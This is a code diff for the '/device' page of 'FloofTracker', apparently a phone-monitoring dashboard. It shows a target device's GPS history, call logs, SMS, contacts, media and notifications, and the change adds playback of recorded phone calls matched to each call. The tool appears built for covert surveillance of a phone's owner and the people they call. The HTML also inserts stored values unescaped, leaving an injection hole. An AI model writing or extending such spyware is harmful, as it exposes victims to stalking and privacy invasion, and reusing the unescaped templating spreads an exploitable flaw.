@@ -677,12 +677,12 @@ app.get('/device', async (req, res) => {
     const device = await Device.findOne({ token });
     const gps = await Gps.find({ token }).sort({ received_at: -1 }).limit(50);
     const calls = await Call.find({ token }).sort({ called_at: -1 });
+    const recordings = await CallRecording.find({ token }).sort({ recorded_at: -1 });
     const sms = await Sms.find({ token }).sort({ received_at: -1 });
     const apps = await App.find({ token }).sort({ usage_seconds: -1 });
     const contacts = await Contact.find({ token });
     const media = await Media.find({ token }).sort({ date_taken: -1 });
     const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(200);
-    const recordings = await CallRecording.find({ token }).sort({ recorded_at: -1 }).limit(50);
 
     res.send(`<!DOCTYPE html><html><head>
     <title>${device?.device_model || 'Device'} - FloofTracker</title>
@@ -722,22 +722,32 @@ app.get('/device', async (req, res) => {
             </div>
         </div>
 
-        <!-- Calls Tab -->
-        <div id="tab-calls" class="tab-content">
-            <div class="card" style="padding:0">
-                ${calls.length === 0 ? '<p class="no-data">No call logs</p>' : `
-                <table>
-                    <tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr>
-                    ${calls.map(c => `<tr>
-                        <td>${c.number}</td>
-                        <td>${c.contact_name || '-'}</td>
-                        <td>${c.call_type}</td>
-                        <td>${c.duration_seconds}s</td>
-                        <td>${new Date(c.called_at).toLocaleString()}</td>
-                    </tr>`).join('')}
-                </table>`}
-            </div>
-        </div>
+       <!-- Calls Tab -->
+<div id="tab-calls" class="tab-content">
+    <div class="card" style="padding:0">
+        ${calls.length === 0 ? '<p class="no-data">No call logs</p>' : `
+        <table>
+            <tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th>Recording</th></tr>
+            ${calls.map(c => {
+                // Match recording within 60 seconds of call
+                const recording = recordings.find(r => 
+                    Math.abs(r.recorded_at - c.called_at) < 60000
+                );
+                return `<tr>
+                    <td>${c.number}</td>
+                    <td>${c.contact_name || '-'}</td>
+                    <td>${c.call_type}</td>
+                    <td>${c.duration_seconds}s</td>
+                    <td>${new Date(c.called_at).toLocaleString()}</td>
+                    <td>${recording ? 
+                        `<audio controls src="data:audio/mp4;base64,${recording.audio_base64}" style="height:32px;width:200px"></audio>` : 
+                        '<span style="color:#888;font-size:12px">No recording</span>'
+                    }</td>
+                </tr>`;
+            }).join('')}
+        </table>`}
+    </div>
+</div>
 
         <!-- SMS Tab -->
         <div id="tab-sms" class="tab-content">
@@ -754,21 +764,6 @@ app.get('/device', async (req, res) => {
                 </table>`}
             </div>
         </div>
-
-<!-- Recordings Tab -->
-<div id="tab-recordings" class="tab-content">
-    <div class="card" style="padding:0">
-        ${recordings.length === 0 ? '<p class="no-data">No call recordings</p>' : `
-        <table>
-            <tr><th>Filename</th><th>Date</th><th>Play</th></tr>
-            ${recordings.map(r => `<tr>
-                <td>${r.filename}</td>
-                <td>${new Date(r.recorded_at).toLocaleString()}</td>
-                <td><audio controls src="data:audio/mp4;base64,${r.audio_base64}"></audio></td>
-            </tr>`).join('')}
-        </table>`}
-    </div>
-</div>
 
         <!-- GPS Tab -->
         <div id="tab-gps" class="tab-content">
